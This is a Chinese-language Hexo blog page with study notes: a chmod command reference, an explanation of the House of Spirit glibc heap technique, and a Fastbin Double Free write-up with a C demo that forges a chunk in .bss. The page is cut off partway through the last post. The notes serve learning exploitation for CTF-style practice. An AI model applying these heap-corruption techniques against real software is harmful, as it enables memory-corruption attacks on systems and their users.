<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>Hexo</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Hexo</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/22/chmod/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/22/chmod/" class="post-title-link" itemprop="url">chmod</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2024-11-22 22:19:37 / 修改时间：22:20:52" itemprop="dateCreated datePublished" datetime="2024-11-22T22:19:37+08:00">2024-11-22</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Linux-chmod命令"><a href="#Linux-chmod命令" class="headerlink" title="Linux chmod命令"></a>Linux chmod命令</h1><p>Linux chmod（英文全拼：change mode）命令是控制用户对文件的权限的命令</p>
<p>Linux&#x2F;Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/file-permissions-rwx.jpg" alt="img"></p>
<p>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。</p>
<p><img src="https://www.runoob.com/wp-content/uploads/2014/08/rwx-standard-unix-permission-bits.png" alt="img"></p>
<p><strong>使用权限</strong> : 所有使用者</p>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod [-cfvR] [--help] [--version] mode file...</span><br></pre></td></tr></table></figure>

<h3 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h3><p>mode : 权限设定字串，格式如下 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ugoa...][[+-=][rwxX]...][,...]</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<ul>
<li>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</li>
<li>+ 表示增加权限、- 表示取消权限、&#x3D; 表示唯一设定权限。</li>
<li>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</li>
</ul>
<p>其他参数说明：</p>
<ul>
<li>-c : 若该文件权限确实已经更改，才显示其更改动作</li>
<li>-f : 若该文件权限无法被更改也不要显示错误讯息</li>
<li>-v : 显示权限变更的详细资料</li>
<li>-R : 对目前目录下的所有文件与子目录进行相同的权限变更(即以递归的方式逐个变更)</li>
<li>–help : 显示辅助说明</li>
<li>–version : 显示版本</li>
</ul>
<h3 id="符号模式"><a href="#符号模式" class="headerlink" title="符号模式"></a>符号模式</h3><p>使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和 permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who 指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示:</p>
<table>
<thead>
<tr>
<th align="left">who</th>
<th align="left">用户类型</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>u</code></td>
<td align="left">user</td>
<td align="left">文件所有者</td>
</tr>
<tr>
<td align="left"><code>g</code></td>
<td align="left">group</td>
<td align="left">文件所有者所在组</td>
</tr>
<tr>
<td align="left"><code>o</code></td>
<td align="left">others</td>
<td align="left">所有其他用户</td>
</tr>
<tr>
<td align="left"><code>a</code></td>
<td align="left">all</td>
<td align="left">所有用户, 相当于 <em>ugo</em></td>
</tr>
</tbody></table>
<p>operator 的符号模式表:</p>
<table>
<thead>
<tr>
<th align="left">Operator</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>+</code></td>
<td align="left">为指定的用户类型增加权限</td>
</tr>
<tr>
<td align="left"><code>-</code></td>
<td align="left">去除指定用户类型的权限</td>
</tr>
<tr>
<td align="left"><code>=</code></td>
<td align="left">设置指定用户权限的设置，即将用户类型的所有权限重新设置</td>
</tr>
</tbody></table>
<p>permission 的符号模式表:</p>
<table>
<thead>
<tr>
<th align="left">模式</th>
<th align="left">名字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>r</code></td>
<td align="left">读</td>
<td align="left">设置为可读权限</td>
</tr>
<tr>
<td align="left"><code>w</code></td>
<td align="left">写</td>
<td align="left">设置为可写权限</td>
</tr>
<tr>
<td align="left"><code>x</code></td>
<td align="left">执行权限</td>
<td align="left">设置为可执行权限</td>
</tr>
<tr>
<td align="left"><code>X</code></td>
<td align="left">特殊执行权限</td>
<td align="left">只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td>
</tr>
<tr>
<td align="left"><code>s</code></td>
<td align="left">setuid&#x2F;gid</td>
<td align="left">当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td>
</tr>
<tr>
<td align="left"><code>t</code></td>
<td align="left">粘贴位</td>
<td align="left">设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td>
</tr>
</tbody></table>
<h3 id="八进制语法"><a href="#八进制语法" class="headerlink" title="八进制语法"></a>八进制语法</h3><p>chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。</p>
<table>
<thead>
<tr>
<th align="left">#</th>
<th align="left">权限</th>
<th align="left">rwx</th>
<th align="left">二进制</th>
</tr>
</thead>
<tbody><tr>
<td align="left">7</td>
<td align="left">读 + 写 + 执行</td>
<td align="left">rwx</td>
<td align="left">111</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">读 + 写</td>
<td align="left">rw-</td>
<td align="left">110</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">读 + 执行</td>
<td align="left">r-x</td>
<td align="left">101</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">只读</td>
<td align="left">r–</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">写 + 执行</td>
<td align="left">-wx</td>
<td align="left">011</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">只写</td>
<td align="left">-w-</td>
<td align="left">010</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">只执行</td>
<td align="left">–x</td>
<td align="left">001</td>
</tr>
<tr>
<td align="left">0</td>
<td align="left">无</td>
<td align="left">—</td>
<td align="left">000</td>
</tr>
</tbody></table>
<p>例如， 765 将这样解释：</p>
<ul>
<li>所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。</li>
<li>用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。</li>
<li>其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。</li>
</ul>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure>

<p>为 ex1.py 文件拥有者增加可执行权限:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure>

<p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure>

<p>此外chmod也可以用数字来表示权限如 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure>

<p>语法为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod abc file</span><br></pre></td></tr></table></figure>

<p>其中a,b,c各为一个数字，分别表示User、Group、及Other的权限。</p>
<h4 id="r-4，w-2，x-1"><a href="#r-4，w-2，x-1" class="headerlink" title="r&#x3D;4，w&#x3D;2，x&#x3D;1"></a>r&#x3D;4，w&#x3D;2，x&#x3D;1</h4><ul>
<li>若要 rwx 属性则 4+2+1&#x3D;7；</li>
<li>若要 rw- 属性则 4+2&#x3D;6；</li>
<li>若要 r-x 属性则 4+1&#x3D;5。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a=rwx file</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 file</span><br></pre></td></tr></table></figure>

<p>效果相同</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod ug=rwx,o=x file</span><br></pre></td></tr></table></figure>

<p>和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 771 file</span><br></pre></td></tr></table></figure>

<p>效果相同</p>
<p>若用 <strong>chmod 4755 filename</strong> 可使此程序具有 root 的权限。</p>
<h3 id="更多说明"><a href="#更多说明" class="headerlink" title="更多说明"></a>更多说明</h3><table>
<thead>
<tr>
<th align="left"><code>命令</code></th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>chmod a+r *file*</code></td>
<td align="left">给file的所有用户增加读权限</td>
</tr>
<tr>
<td align="left"><code>chmod a-x *file*</code></td>
<td align="left">删除file的所有用户的执行权限</td>
</tr>
<tr>
<td align="left"><code>chmod a+rw *file*</code></td>
<td align="left">给file的所有用户增加读写权限</td>
</tr>
<tr>
<td align="left"><code>chmod +rwx *file*</code></td>
<td align="left">给file的所有用户增加读写执行权限</td>
</tr>
<tr>
<td align="left"><code>chmod u=rw,go= *file*</code></td>
<td align="left">对file的所有者设置读写权限，清空该用户组和其他用户对file的所有权限（空格代表无权限）</td>
</tr>
<tr>
<td align="left"><code>chmod -R u+r,go-r *docs*</code></td>
<td align="left">对目录docs和其子目录层次结构中的所有文件给用户增加读权限，而对用户组和其他用户删除读权限</td>
</tr>
<tr>
<td align="left"><code>chmod 664 *file*</code></td>
<td align="left">对file的所有者和用户组设置读写权限, 为其其他用户设置读权限</td>
</tr>
<tr>
<td align="left"><code>chmod 0755 *file*</code></td>
<td align="left">相当于<code>u=rwx (4+2+1),go=rx (4+1 &amp; 4+1)</code>。<code>0</code> 没有特殊模式。</td>
</tr>
<tr>
<td align="left"><code>chmod 4755 *file*</code></td>
<td align="left"><code>4</code>设置了设置<a target="_blank" rel="noopener" href="https://www.runoob.com/wiki/%E7%94%A8%E6%88%B7ID">用户ID</a>位，剩下的相当于 u&#x3D;rwx (4+2+1),go&#x3D;rx (4+1 &amp; 4+1)。</td>
</tr>
<tr>
<td align="left"><code>find path/ -type d -exec chmod a-x &#123;&#125; \;</code></td>
<td align="left">删除可执行权限对path&#x2F;以及其所有的目录（不包括文件）的所有用户，使用’-type f’匹配文件</td>
</tr>
<tr>
<td align="left"><code>find path/ -type d -exec chmod a+x &#123;&#125; \;</code></td>
<td align="left">允许所有用户浏览或通过目录path&#x2F;</td>
</tr>
</tbody></table>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/20/HouseOfSpirit/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/20/HouseOfSpirit/" class="post-title-link" itemprop="url">HouseOfSpirit</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-20 22:25:14" itemprop="dateCreated datePublished" datetime="2024-11-20T22:25:14+08:00">2024-11-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-22 19:49:10" itemprop="dateModified" datetime="2024-11-22T19:49:10+08:00">2024-11-22</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h5 id="核心："><a href="#核心：" class="headerlink" title="核心："></a>核心：</h5><p>在目标位置处伪造fastbin chunk，并将其释放，从而达到分配指定地址的chunk的目的</p>
<h5 id="特征："><a href="#特征：" class="headerlink" title="特征："></a>特征：</h5><p>fastbin double free所释放的chunk是<strong>本身程序自己malloc产生的</strong>，但是house of spirit是<strong>去释放指定地址的chunk</strong>。那么这个chunk我们可以通过<em>伪造的方式</em>构建，他可以是<em>任意可写地址</em>。在释放时，需要经过一些检查，去判断该释放的chunk是否为程序自身创建的。那么需要绕过这些检查：</p>
<ul>
<li><h5 id="fake-chunk-的-ISMMAP-位不能为-1，因为-free-时，如果是-mmap-的-chunk，会单独处理"><a href="#fake-chunk-的-ISMMAP-位不能为-1，因为-free-时，如果是-mmap-的-chunk，会单独处理" class="headerlink" title="fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理"></a>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</h5><p>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的，这个标志位位于size低二比特位</p>
</li>
<li><h5 id="fake-chunk-地址需要对齐，-MALLOC-ALIGN-MASK"><a href="#fake-chunk-地址需要对齐，-MALLOC-ALIGN-MASK" class="headerlink" title="fake chunk 地址需要对齐， MALLOC_ALIGN_MASK"></a>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</h5><p>因为fake_chunk可以在任意可写位置构造，这里对齐指的是地址上的对齐而不仅仅是内存对齐。</p>
<p>比如32位程序的话fake_chunk的prev_size所在地址就应该位0xXXXX0或0xXXXX4。</p>
<p>​       64位的话地址就应该在0xXXXX0或0xXXXX8。</p>
</li>
<li><h5 id="fake-chunk-的-size-大小需要满足对应的-fastbin-的需求，同时也得对齐"><a href="#fake-chunk-的-size-大小需要满足对应的-fastbin-的需求，同时也得对齐" class="headerlink" title="fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐"></a>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐</h5><p>fake_chunk如果想挂进fastbin的话构造的大小就不能大于0x80，关于对齐和上面一样，并且在确定prev_size的位置后size所在位置要满足堆块结构的摆放位置</p>
</li>
<li><h5 id="fake-chunk-的-next-chunk-的大小不能小于-2-SIZE-SZ，同时也不能大于av-system-mem"><a href="#fake-chunk-的-next-chunk-的大小不能小于-2-SIZE-SZ，同时也不能大于av-system-mem" class="headerlink" title="fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem"></a>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem</h5><p>fake_chunk 的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。</p>
<p>32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。</p>
<p>最大不能超过av-&gt;system_mem，即128kb。</p>
<p>next_chunk的大小一般我们会设置成为一个超过fastbin最大的范围的一个数，但要小于128kb，这样做的目的是在chunk连续释放的时候，能够保证伪造的chunk在释放后能够挂在fastbin中main_arena的前面，这样以来我们再一次申请伪造chunk大小的块时可以直接重启伪造chunk。</p>
</li>
<li><h5 id="fake-chunk-对应的-fastbin-链表头部不能是该-fake-chunk，即不能构成-double-free-的情况"><a href="#fake-chunk-对应的-fastbin-链表头部不能是该-fake-chunk，即不能构成-double-free-的情况" class="headerlink" title="fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况"></a>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</h5><p>这个检查就是fake_chunk前一个释放块不能是fake_chunk本身，如果是的话_int_free函数就会检查出来并且中断。</p>
</li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/11/17/FastbinAttack/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/11/17/FastbinAttack/" class="post-title-link" itemprop="url">FastbinAttack</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-11-17 19:47:26" itemprop="dateCreated datePublished" datetime="2024-11-17T19:47:26+08:00">2024-11-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-11-20 22:23:22" itemprop="dateModified" datetime="2024-11-20T22:23:22+08:00">2024-11-20</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Fastbin Attack</p>
<p>图文源<a target="_blank" rel="noopener" href="https://hollk.blog.csdn.net/article/details/109199077">好好说话之Fastbin Attack（1）：Fastbin Double Free_pwn 好好说话-CSDN博客</a>根据自己理解做了摘抄</p>
<p>​	这一类漏洞利用的方法主要基于fastbin机制的缺陷，其实fastbin attack并不是指某一种利用方法，而是一些。这类利用的前提是：</p>
<blockquote>
<p>存在堆溢出、use-after-free等能控制chunk内容的漏洞<br>漏洞发生于fastbin类型的chunk中</p>
</blockquote>
<p>​	如果细分的话，可以做如下的分类：</p>
<blockquote>
<p>Fastbin Double Free<br>House of Spirit<br>Alloc to Stack<br>Arbitrary Alloc</p>
</blockquote>
<p>​	前两种主要漏洞侧重于利用free函数释放的真的 chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc申请指定位置chunk进行攻击。主要讲解Fastbin Double Free。</p>
<p><strong>原理</strong><br>    fastbin attack存在的原因在于fastbin时使用单向链表来维护释放的堆块的，并且由fastbin管理的chunk即使被释放，其next_chunk的prev_inuse位也不会被清空。</p>
<ul>
<li>在fastbin中后一个被释放的chunk的fd指向前一个被释放的chunk的prev_size，main_arena指向最后一个被释放的chunk的prev_size。</li>
<li>看一下在释放阶段的chunk的prev_inuse标志位为1，回来在看释放后的内存情况，chunk的<code>prev_inuse</code>依然还是1不变。</li>
<li>fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。</li>
</ul>
<p><strong>Fastbin Double Free</strong></p>
<p>fastbin中的chunk被释放<strong>两次及以上</strong>。后果是多次分配可从fastbin链表中取出同一个堆块，结合堆块的数据内容可以实现类似于**类型混淆(<em>type confused</em>)**的效果。</p>
<p><strong>Fastbin Double Free成功利用主要原因：</strong></p>
<blockquote>
<p>fastbin的堆块被释放后next_chunk的prev_inuse位不会被清空。<br>fastbin在执行free的时候仅验证了main_arena直接指向的块，即链表指针头部的块。对于链表后面的块并没有进行验证。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g hollk4.c -o hollk4</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class"> 5 &#123;</span></span><br><span class="line"> <span class="number">6</span>     <span class="type">long</span> <span class="type">long</span> pre_size;</span><br><span class="line"> <span class="number">7</span>     <span class="type">long</span> <span class="type">long</span> size;</span><br><span class="line"> <span class="number">8</span>     <span class="type">long</span> <span class="type">long</span> fd;</span><br><span class="line"> <span class="number">9</span>     <span class="type">long</span> <span class="type">long</span> bk;</span><br><span class="line"><span class="number">10</span> &#125; CHUNK,*PCHUNK;</span><br><span class="line"><span class="number">11</span> </span><br><span class="line"><span class="number">12</span> CHUNK bss_chunk;</span><br><span class="line"><span class="number">13</span> </span><br><span class="line"><span class="number">14</span> <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">15 &#123;</span><br><span class="line"><span class="number">16</span>     <span class="type">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line"><span class="number">17</span>     <span class="type">void</span> *chunk_a,*chunk_b;</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span>     bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line"><span class="number">20</span>     chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">21</span>     chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">22</span> </span><br><span class="line"><span class="number">23</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">24</span>     <span class="built_in">free</span>(chunk2);</span><br><span class="line"><span class="number">25</span>     <span class="built_in">free</span>(chunk1);</span><br><span class="line"><span class="number">26</span> </span><br><span class="line"><span class="number">27</span>     chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">28</span>     *(<span class="type">long</span> <span class="type">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line"><span class="number">29</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">30</span>     <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">31</span>     chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="number">32</span>     <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line"><span class="number">33</span>     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">34</span> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\16350\Downloads\0af2d29ffc6fe4a3064729a7adc8a1c2.png"></p>
<blockquote>
<p><strong>首先经过double free之后fastbin中的单向链表为chunk1_double –&gt; chunk2 –&gt; chunk1在经过一次malloc申请后main_arena指向的chunk1_double被重新启用，即chunk1倍重新启用，main_arena指向chunk2，并且将chunk1的fd从原来的指向chunk2修改为指向结构体指针chunk1 –&gt; bss_chunk，也就是说在fastbin单向链表中bss_chunk已经作为chunk1前一个被释放的块的存在了</strong></p>
<p><strong>接下来第二次malloc申请后main_arena指向的chunk2被启用，main_arena重新指向chunk1</strong></p>
